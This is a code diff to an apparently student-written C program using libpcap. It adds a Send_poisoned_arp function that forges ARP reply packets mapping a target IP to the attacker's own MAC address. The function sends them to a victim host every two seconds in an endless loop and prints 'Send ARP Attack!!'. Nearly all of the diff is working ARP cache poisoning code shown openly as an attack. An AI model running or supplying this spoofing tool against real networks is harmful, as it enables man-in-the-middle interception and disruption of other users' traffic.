@@ -41,6 +41,7 @@ struct base_info{
 void Init_arp(struct arphdr *arp, uint16_t opcode);
 int Get_my_hwaddr(struct base_info *info);
 int Get_sender_hwaddr(struct base_info *info);
+void Send_poisoned_arp(struct base_info *info);
 
 
 int main(int argc, char *argv[])
@@ -56,15 +57,14 @@ int main(int argc, char *argv[])
 	strcpy(info.dev, argv[1]);
 	strcpy(info.sdr_ip, argv[2]);
 	strcpy(info.tar_ip, argv[3]);
-	//printf("%s\n", info.sdr_ip);
-	//printf("%s\n", info.tar_ip);
+
 	if (!Get_my_hwaddr(&info))
 		return -1;
-	//for (i=0 ; i<6 ; i++)
-	//	printf(" %02x\n", info.my_mac[i]);
 
 	if (!Get_sender_hwaddr(&info))
 		return -1;
+
+	Send_poisoned_arp(&info);
 	
 	return(0);
 }
@@ -203,6 +203,55 @@ int Get_sender_hwaddr(struct base_info *info)
 	pcap_close(handle);
 	return 1;
 }
+
+
+void Send_poisoned_arp(struct base_info *info)
+{
+	pcap_t *handle;			/* Session handle */
+	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
+	int i;
+	unsigned char send[50] = {0};	/* Buffer to send */
+	struct ethhdr ether;
+	struct arphdr arp;
+
+	/* Open the session in promiscuous mode */
+	handle = pcap_open_live(info->dev, 65536, 0, 1000, errbuf);
+	if (handle == NULL) {
+		fprintf(stderr, "Couldn't open device %s: %s\n", info->dev, errbuf);
+		return;
+	}
+
+	/* set ethernet header */
+	for (i=0 ; i<6 ; i++)
+		ether.h_source[i] = info->my_mac[i];
+	for (i=0 ; i<6 ; i++)
+		ether.h_dest[i] = info->sdr_mac[i];
+	ether.h_proto = htons(ETHERTYPE_ARP);
+	memcpy(send, (char*)&ether, 14);
+
+	/* set arp header */
+	Init_arp(&arp, ARP_REPLY);
+	inet_pton(AF_INET, info->tar_ip, &arp.sdr_ip);
+	inet_pton(AF_INET, info->sdr_ip, &arp.tar_ip);
+	for (i=0 ; i<6 ; i++)
+		arp.sdr_mac[i] = info->my_mac[i];
+	for (i=0 ; i<6 ; i++)
+		arp.tar_mac[i] = info->sdr_mac[i];
+	memcpy(send+14, (void*)&arp, sizeof(struct arphdr));
+
+	while (1)
+	{
+		/* Send arp request to sender */
+		if (pcap_sendpacket(handle, send, 42))
+		{
+			fprintf(stderr, "Couldn't send packet\n");
+			return;
+		}
+		printf("Send ARP Attack!!\n");
+		sleep(2);
+	}
+}
+
 
 
 
